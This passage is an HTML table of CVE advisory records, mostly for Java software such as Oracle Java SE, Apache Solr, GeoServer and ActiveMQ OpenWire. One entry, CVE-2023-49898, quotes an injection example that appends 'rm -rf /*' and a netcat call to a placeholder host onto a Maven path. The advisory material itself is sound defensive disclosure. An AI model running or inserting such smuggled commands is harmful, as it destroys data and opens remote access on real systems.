3.1 Base Score 5.9 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20925">CVE-2024-20925</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JavaFX). Supported versions that are affected are Oracle Java SE: 8u391; Oracle GraalVM Enterprise Edition: 20.3.12 and 21.3.8. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.1 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20923">CVE-2024-20923</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JavaFX). Supported versions that are affected are Oracle Java SE: 8u391; Oracle GraalVM Enterprise Edition: 20.3.12 and 21.3.8. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20922">CVE-2024-20922</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JavaFX). Supported versions that are affected are Oracle Java SE: 8u391; Oracle GraalVM Enterprise Edition: 20.3.12 and 21.3.8. Difficult to exploit vulnerability allows unauthenticated attacker with logon to the infrastructure where Oracle Java SE, Oracle GraalVM Enterprise Edition executes to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 2.5 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20921">CVE-2024-20921</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and 22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 5.9 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20919">CVE-2024-20919</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and 22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.9 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20918">CVE-2024-20918</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and 22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20903">CVE-2024-20903</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 19.3-19.21 and 21.3-21.12. Easily exploitable vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via Oracle Net to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java VM accessible data. CVSS 3.1 Base Score 6.5 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-1300">CVE-2024-1300</a></td>
		<td valign="top">A vulnerability in the Eclipse Vert.x toolkit causes a memory leak in TCP servers configured with TLS and SNI support. When processing an unknown SNI server name assigned the default certificate instead of a mapped certificate, the SSL context is erroneously cached in the server name map, leading to memory exhaustion. This flaw allows attackers to send TLS client hello messages with fake server names, triggering a JVM out-of-memory error.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-0601">CVE-2024-0601</a></td>
		<td valign="top">A vulnerability was found in ZhongFuCheng3y Austin 1.0. It has been rated as critical. Affected by this issue is the function getRemoteUrl2File of the file src\main\java\com\java3y\austin\support\utils\AustinFileUtils.java of the component Email Message Template Handler. The manipulation leads to server-side request forgery. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-250838 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-0599">CVE-2024-0599</a></td>
		<td valign="top">A vulnerability was found in Jspxcms 10.2.0. It has been declared as problematic. Affected by this vulnerability is an unknown functionality of the file src\main\java\com\jspxcms\core\web\back\InfoController.java of the component Document Management Page. The manipulation of the argument title leads to cross site scripting. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250837 was assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-0491">CVE-2024-0491</a></td>
		<td valign="top">A vulnerability classified as problematic has been found in Huaxia ERP up to 3.1. Affected is an unknown function of the file src/main/java/com/jsh/erp/controller/UserController.java. The manipulation leads to weak password recovery. It is possible to launch the attack remotely. Upgrading to version 3.2 is able to address this issue. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-250596.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-0301">CVE-2024-0301</a></td>
		<td valign="top">A vulnerability classified as critical was found in fhs-opensource iparking 1.5.22.RELEASE. This vulnerability affects the function getData of the file src/main/java/com/xhb/pay/action/PayTempOrderAction.java. The manipulation leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-249868.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-0195">CVE-2024-0195</a></td>
		<td valign="top">A vulnerability, which was classified as critical, was found in spider-flow 0.4.3. Affected is the function FunctionService.saveFunction of the file src/main/java/org/spiderflow/controller/FunctionController.java. The manipulation leads to code injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-249510 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-7272">CVE-2023-7272</a></td>
		<td valign="top">In Eclipse Parsson before 1.0.4 and 1.1.3, a document with a large depth of nested objects can allow an attacker to cause a Java stack overflow exception and denial of service. Eclipse Parsson allows processing (e.g. parse, generate, transform and query) JSON documents.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-7171">CVE-2023-7171</a></td>
		<td valign="top">A vulnerability was found in Novel-Plus up to 4.2.0. It has been declared as problematic. Affected by this vulnerability is an unknown functionality of the file novel-admin/src/main/java/com/java2nb/novel/controller/FriendLinkController.java of the component Friendly Link Handler. The manipulation leads to cross site scripting. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The patch is named d6093d8182362422370d7eaf6c53afde9ee45215. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-249307.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-7148">CVE-2023-7148</a></td>
		<td valign="top">A vulnerability has been found in ShifuML shifu 0.12.0 and classified as critical. Affected by this vulnerability is an unknown functionality of the file src/main/java/ml/shifu/shifu/core/DataPurifier.java of the component Java Expression Language Handler. The manipulation of the argument FilterExpression leads to code injection. The attack can be launched remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-249151.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-5675">CVE-2023-5675</a></td>
		<td valign="top">A flaw was found in Quarkus. When a Quarkus RestEasy Classic or Reactive JAX-RS endpoint has its methods declared in the abstract Java class or customized by Quarkus extensions using the annotation processor, the authorization of these methods will not be enforced if it is enabled by either 'quarkus.security.jaxrs.deny-unannotated-endpoints' or 'quarkus.security.jaxrs.default-roles-allowed' properties.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-5257">CVE-2023-5257</a></td>
		<td valign="top">A vulnerability was found in WhiteHSBG JNDIExploit 1.4 on Windows. It has been rated as problematic. Affected by this issue is the function handleFileRequest of the file src/main/java/com/feihong/ldap/HTTPServer.java. The manipulation leads to path traversal. The exploit has been disclosed to the public and may be used. VDB-240866 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-51775">CVE-2023-51775</a></td>
		<td valign="top">The jose4j component before 0.9.4 for Java allows attackers to cause a denial of service (CPU consumption) via a large p2c (aka PBES2 Count) value.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-51445">CVE-2023-51445</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. A stored cross-site scripting (XSS) vulnerability exists in versions prior to 2.23.3 and 2.24.0 that enables an authenticated administrator with workspace-level privileges to store a JavaScript payload in uploaded style/legend resources that will execute in the context of another administrator's browser when viewed in the REST Resources API. Access to the REST Resources API is limited to full administrators by default and granting non-administrators access to this endpoint should be carefully considered as it may allow access to files containing sensitive information. Versions 2.23.3 and 2.24.0 contain a patch for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-51444">CVE-2023-51444</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. An arbitrary file upload vulnerability exists in versions prior to 2.23.4 and 2.24.1 that enables an authenticated administrator with permissions to modify coverage stores through the REST Coverage Store API to upload arbitrary file contents to arbitrary file locations which can lead to remote code execution. Coverage stores that are configured using relative paths use a GeoServer Resource implementation that has validation to prevent path traversal but coverage stores that are configured using absolute paths use a different Resource implementation that does not prevent path traversal. This vulnerability can lead to executing arbitrary code. An administrator with limited privileges could also potentially exploit this to overwrite GeoServer security files and obtain full administrator privileges. Versions 2.23.4 and 2.24.1 contain a fix for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-51441">CVE-2023-51441</a></td>
		<td valign="top">** UNSUPPORTED WHEN ASSIGNED ** Improper Input Validation vulnerability in Apache Axis allowed users with access to the admin service to perform possible SSRF This issue affects Apache Axis: through 1.3. As Axis 1 has been EOL we recommend you migrate to a different SOAP engine, such as Apache Axis 2/Java. Alternatively you could use a build of Axis with the patch from https://github.com/apache/axis-axis1-java/commit/685c309febc64aa393b2d64a05f90e7eb9f73e06 applied. The Apache Axis project does not expect to create an Axis 1.x release fixing this problem, though contributors that would like to work towards this are welcome.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-51079">CVE-2023-51079</a></td>
		<td valign="top">** DISPUTED ** A long execution time can occur in the ParseTools.subCompileExpression method in MVEL 2.5.0.Final because of many Java class lookups. NOTE: the vendor disputes this because "the only thing that you could expect is that the parser will take a crazy amount of time to complete its task."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-5072">CVE-2023-5072</a></td>
		<td valign="top">Denial of Service in JSON-Java versions up to and including 20230618. A bug in the parser means that an input string of modest size can lead to indefinite amounts of memory being used.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-50422">CVE-2023-50422</a></td>
		<td valign="top">SAP BTP Security Services Integration Library ([Java] cloud-security-services-integration-library) - versions below 2.17.0 and versions from 3.0.0 to before 3.3.0, allow under certain conditions an escalation of privileges. On successful exploitation, an unauthenticated attacker can obtain arbitrary permissions within the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-50386">CVE-2023-50386</a></td>
		<td valign="top">Improper Control of Dynamically-Managed Code Resources, Unrestricted Upload of File with Dangerous Type, Inclusion of Functionality from Untrusted Control Sphere vulnerability in Apache Solr.This issue affects Apache Solr: from 6.0.0 through 8.11.2, from 9.0.0 before 9.4.1. In the affected versions, Solr ConfigSets accepted Java jar and class files to be uploaded through the ConfigSets API. When backing up Solr Collections, these configSet files would be saved to disk when using the LocalFileSystemRepository (the default for backups). If the backup was saved to a directory that Solr uses in its ClassPath/ClassLoaders, then the jar and class files would be available to use with any ConfigSet, trusted or untrusted. When Solr is run in a secure way (Authorization enabled), as is strongly suggested, this vulnerability is limited to extending the Backup permissions with the ability to add libraries. Users are recommended to upgrade to version 8.11.3 or 9.4.1, which fix the issue. In these versions, the following protections have been added: * Users are no longer able to upload files to a configSet that could be executed via a Java ClassLoader. * The Backup API restricts saving backups to directories that are used in the ClassLoader.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-50291">CVE-2023-50291</a></td>
		<td valign="top">Insufficiently Protected Credentials vulnerability in Apache Solr. This issue affects Apache Solr: from 6.0.0 through 8.11.2, from 9.0.0 before 9.3.0. One of the two endpoints that publishes the Solr process' Java system properties, /admin/info/properties, was only setup to hide system properties that had "password" contained in the name. There are a number of sensitive system properties, such as "basicauth" and "aws.secretKey" do not contain "password", thus their values were published via the "/admin/info/properties" endpoint. This endpoint populates the list of System Properties on the home screen of the Solr Admin page, making the exposed credentials visible in the UI. This /admin/info/properties endpoint is protected under the "config-read" permission. Therefore, Solr Clouds with Authorization enabled will only be vulnerable through logged-in users that have the "config-read" permission. Users are recommended to upgrade to version 9.3.0 or 8.11.3, which fixes the issue. A single option now controls hiding Java system property for all endpoints, "-Dsolr.hiddenSysProps". By default all known sensitive properties are hidden (including "-Dbasicauth"), as well as any property with a name containing "secret" or "password". Users who cannot upgrade can also use the following Java system property to fix the issue: '-Dsolr.redaction.system.pattern=.*(password|secret|basicauth).*'

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-50290">CVE-2023-50290</a></td>
		<td valign="top">Exposure of Sensitive Information to an Unauthorized Actor vulnerability in Apache Solr. The Solr Metrics API publishes all unprotected environment variables available to each Apache Solr instance. Users are able to specify which environment variables to hide, however, the default list is designed to work for known secret Java system properties. Environment variables cannot be strictly defined in Solr, like Java system properties can be, and may be set for the entire host, unlike Java system properties which are set per-Java-proccess. The Solr Metrics API is protected by the "metrics-read" permission. Therefore, Solr Clouds with Authorization setup will only be vulnerable via users with the "metrics-read" permission. This issue affects Apache Solr: from 9.0.0 before 9.3.0. Users are recommended to upgrade to version 9.3.0 or later, in which environment variables are not published via the Metrics API.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-5016">CVE-2023-5016</a></td>
		<td valign="top">A vulnerability was found in spider-flow up to 0.5.0. It has been declared as critical. Affected by this vulnerability is the function DriverManager.getConnection of the file src/main/java/org/spiderflow/controller/DataSourceController.java of the component API. The manipulation leads to deserialization. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-239857 was assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-49898">CVE-2023-49898</a></td>
		<td valign="top">In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low. Mitigation: all users should upgrade to 2.1.2 Example: ##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &amp;&amp;, compilation failure use "||" or "&amp;&amp;": /usr/share/java/maven-3/conf/settings.xml || rm -rf /* /usr/share/java/maven-3/conf/settings.xml &amp;&amp; nohup nc x.x.x.x 8899 &amp;

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-49693">CVE-2023-49693</a></td>
		<td valign="top">NETGEAR ProSAFE Network Management System has Java Debug Wire Protocol (JDWP) listening on port 11611 and it is remotely accessible by unauthenticated users, allowing attackers to execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-49581">CVE-2023-49581</a></td>
		<td valign="top">SAP GUI for Windows and SAP GUI for Java allow an unauthenticated attacker to access information which would otherwise be restricted and confidential. In addition, this vulnerability allows the unauthenticated attacker to write data to a database table. By doing so the attacker could increase response times of the AS ABAP, leading to mild impact on availability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-49580">CVE-2023-49580</a></td>
		<td valign="top">SAP GUI for Windows and SAP GUI for Java - versions SAP_BASIS 755, SAP_BASIS 756, SAP_BASIS 757, SAP_BASIS 758, allow an unauthenticated attacker to access information which would otherwise be restricted and confidential. In addition, this vulnerability allows the unauthenticated attacker to create Layout configurations of the ABAP List Viewer and with this causing a mild impact on integrity and availability, e.g. also increasing the response times of the AS ABAP.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-49113">CVE-2023-49113</a></td>
		<td valign="top">The Kiuwan Local Analyzer (KLA) Java scanning application contains several hard-coded secrets in plain text format. In some cases, this can potentially compromise the confidentiality of the scan results. Several credentials were found in the JAR files of the Kiuwan Local Analyzer. The JAR file "lib.engine/insight/optimyth-insight.jar" contains the file "InsightServicesConfig.properties", which has the configuration tokens "insight.github.user" as well as "insight.github.password" prefilled with credentials. At least the specified username corresponds to a valid GitHub account. The JAR file "lib.engine/insight/optimyth-insight.jar" also contains the file "es/als/security/Encryptor.properties", in which the key used for encrypting the results of any performed scan. This issue affects Kiuwan SAST: &lt;master.1808.p685.q13371

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-49093">CVE-2023-49093</a></td>
		<td valign="top">HtmlUnit is a GUI-less browser for Java programs. HtmlUnit is vulnerable to Remote Code Execution (RCE) via XSTL, when browsing the attacker&amp;#8217;s webpage. This vulnerability has been patched in version 3.9.0

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-48795">CVE-2023-48795</a></td>
		<td valign="top">The SSH transport protocol with certain OpenSSH extensions, found in OpenSSH before 9.6 and other products, allows remote attackers to bypass integrity checks such that some packets are omitted (from the extension negotiation message), and a client and server may consequently end up with a connection for which some security features have been downgraded or disabled, aka a Terrapin attack. This occurs because the SSH Binary Packet Protocol (BPP), implemented by these extensions, mishandles the handshake phase and mishandles use of sequence numbers. For example, there is an effective attack against SSH's use of ChaCha20-Poly1305 (and CBC with Encrypt-then-MAC). The bypass occurs in chacha20-poly1305@openssh.com and (if CBC is used) the -etm@openssh.com MAC algorithms. This also affects Maverick Synergy Java SSH API before 3.1.0-SNAPSHOT, Dropbear through 2022.83, Ssh before 5.1.1 in Erlang/OTP, PuTTY before 0.80, AsyncSSH before 2.14.2, golang.org/x/crypto before 0.17.0, libssh before 0.10.6, libssh2 through 1.11.0, Thorn Tech SFTP Gateway before 3.4.6, Tera Term before 5.1, Paramiko before 3.4.0, jsch before 0.2.15, SFTPGo before 2.5.6, Netgate pfSense Plus through 23.09.1, Netgate pfSense CE through 2.7.2, HPN-SSH through 18.2.0, ProFTPD before 1.3.8b (and before 1.3.9rc2), ORYX CycloneSSH before 2.3.4, NetSarang XShell 7 before Build 0144, CrushFTP before 10.6.0, ConnectBot SSH library before 2.2.22, Apache MINA sshd through 2.11.0, sshj through 0.37.0, TinySSH through 20230101, trilead-ssh2 6401, LANCOM LCOS and LANconfig, FileZilla before 3.66.4, Nova before 11.8, PKIX-SSH before 14.4, SecureCRT before 9.4.3, Transmit5 before 5.10.4, Win32-OpenSSH before 9.5.0.0p1-Beta, WinSCP before 6.2.2, Bitvise SSH Server before 9.32, Bitvise SSH Client before 9.33, KiTTY through 0.76.1.13, the net-ssh gem 7.2.0 for Ruby, the mscdex ssh2 module before 1.15.0 for Node.js, the thrussh library before 0.35.1 for Rust, and the Russh crate before 0.40.2 for Rust.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-4785">CVE-2023-4785</a></td>
		<td valign="top">Lack of error handling in the TCP server in Google's gRPC starting version 1.23 on posix-compatible platforms (ex. Linux) allows an attacker to cause a denial of service by initiating a significant number of connections with the server. Note that gRPC C++ Python, and Ruby are affected, but gRPC Java, and Go are NOT affected.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-47174">CVE-2023-47174</a></td>
		<td valign="top">Thorn SFTP gateway 3.4.x before 3.4.4 uses Pivotal Spring Framework for Java deserialization of untrusted data, which is not supported by Pivotal, a related issue to CVE-2016-1000027. Also, within the specific context of Thorn SFTP gateway, this leads to remote code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-46801">CVE-2023-46801</a></td>
		<td valign="top">In Apache Linkis &lt;= 1.5.0, data source management module, when adding Mysql data source, exists remote code execution vulnerability for java version &lt; 1.8.0_241. The deserialization vulnerability exploited through jrmp can inject malicious files into the server and execute them. This attack requires the attacker to obtain an authorized account from Linkis before it can be carried out. We recommend that users upgrade the java version to &gt;= 1.8.0_241. Or users upgrade Linkis to version 1.6.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-46674">CVE-2023-46674</a></td>
		<td valign="top">An issue was identified that allowed the unsafe deserialization of java objects from hadoop or spark configuration properties that could have been modified by authenticated users. Elastic would like to thank Yakov Shafranovich, with Amazon Web Services for reporting this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-46604">CVE-2023-46604</a></td>
		<td valign="top">The Java OpenWire protocol marshaller is vulnerable to Remote Code Execution. This vulnerability may allow a remote attacker with network access to either a Java-based OpenWire broker or client to run arbitrary shell commands by manipulating serialized class types in the OpenWire protocol to cause either the client or the broker (respectively) to instantiate any class on the classpath. Users are recommended to upgrade both brokers and clients to version 5.15.16, 5.16.7, 5.17.6, or 5.18.3 which fixes this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-46442">CVE-2023-46442</a></td>
		<td valign="top">An infinite loop in the retrieveActiveBody function of Soot before v4.4.1 under Java 8 allows attackers to cause a Denial of Service (DoS).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-46302">CVE-2023-46302</a></td>
		<td valign="top">Apache Software Foundation Apache Submarine has a bug when serializing against yaml. The bug is caused by snakeyaml https://nvd.nist.gov/vuln/detail/CVE-2022-1471 . Apache Submarine uses JAXRS to define REST endpoints. In order to handle YAML requests (using application/yaml content-type), it defines a YamlEntityProvider entity provider that will process all incoming YAML requests. In order to unmarshal the request, the readFrom method is invoked, passing the entityStream containing the user-supplied data in `submarine-server/server-core/src/main/java/org/apache/submarine/server/utils/YamlUtils.java`. We have now fixed this issue in the new version by replacing to `jackson-dataformat-yaml`. This issue affects Apache Submarine: from 0.7.0 before 0.8.0. Users are recommended to upgrade to version 0.8.0, which fixes this issue. If using the version smaller than 0.8.0 and not want to upgrade, you can try cherry-pick PR https://github.com/apache/submarine/pull/1054 and rebuild the submart-server image to fix this.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-46139">CVE-2023-46139</a></td>
		<td valign="top">KernelSU is a Kernel based root solution for Android. Starting in version 0.6.1 and prior to version 0.7.0, if a KernelSU installed device is infected with a malware whose app signing block specially constructed, it can take over root privileges on the device. The vulnerable verification logic actually obtains the signature of the last block with an id of `0x7109871a`, while the verification logic during Android installation is to obtain the first one. In addition to the actual signature upgrade that has been fixed (KSU thought it was V2 but was actually V3), there is also the problem of actual signature downgrading (KSU thought it was V2 but was actually V1). Find a condition in the signature verification logic that will cause the signature not to be found error, and KernelSU does not implement the same conditions, so KSU thinks there is a V2 signature, but the APK signature verification actually uses the V1 signature. This issue is fixed in version 0.7.0. As workarounds, keep the KernelSU manager installed and avoid installing unknown apps.

</td>
	</tr>
	<tr>
